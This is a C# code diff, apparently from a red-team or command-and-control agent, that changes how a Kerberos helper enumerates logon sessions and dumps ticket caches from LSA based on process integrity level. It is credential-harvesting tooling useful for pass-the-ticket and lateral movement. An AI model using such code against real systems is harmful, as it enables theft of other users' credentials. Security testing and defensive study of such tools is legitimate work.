@@ -402,6 +402,12 @@ internal class KerberosHelpers
     internal static IEnumerable<KerberosTicket> TriageTickets(bool getSystemTickets = false, string targetLuid = "")
     {
         List<KerberosTicket> allTickets = [];
+        bool highIntegrity = false;
+        if (Agent.GetIdentityManager().GetIntegrityLevel() > IntegrityLevel.MediumIntegrity)
+        {
+            highIntegrity = true;
+        }
+        string currentLuid = Agent.GetTicketManager().GetCurrentLuid();
         DebugHelp.DebugWriteLine("Starting to triage tickets from LSA");
         (HANDLE lsaHandle, uint authPackage, IEnumerable<LUID> logonSessions, string error) =  InitKerberosConnectionAndSessionInfo();
         try
@@ -414,19 +420,27 @@ internal class KerberosHelpers
             // get tickets from each session
             foreach (var logonSession in logonSessions)
             {
-                //if a target LUID is provided, skip any that do not match
-                if(!string.IsNullOrWhiteSpace(targetLuid) && logonSession.ToString() != targetLuid)
+                //if we're not high integrity, only get tickets for our current sessionID
+                if(!highIntegrity && logonSession.ToString() != currentLuid)
+                {
+                    continue;
+                }
+                // we are high integrity, so only skip tickets that aren't the target id if we don't want all tickets
+                if(!getSystemTickets && logonSession.ToString() != targetLuid)
                 {
                     continue;
                 }
                 var sessionData = GetLogonSessionData(new(logonSession));
                 //should skip any non-user accounts by checking the session id
-                if (getSystemTickets is false && sessionData.Session is 0)
+                if (sessionData.LogonId.IsNull)
                 {
                     continue;
                 }
-                var tickets = GetTicketCache(lsaHandle, authPackage, logonSession);
-                allTickets.AddRange(tickets);
+                var tickets = GetTicketCache(lsaHandle, authPackage, sessionData.LogonId);
+                if(tickets is not null)
+                {
+                    allTickets.AddRange(tickets);
+                }
             }
         }
         catch (Exception ex)
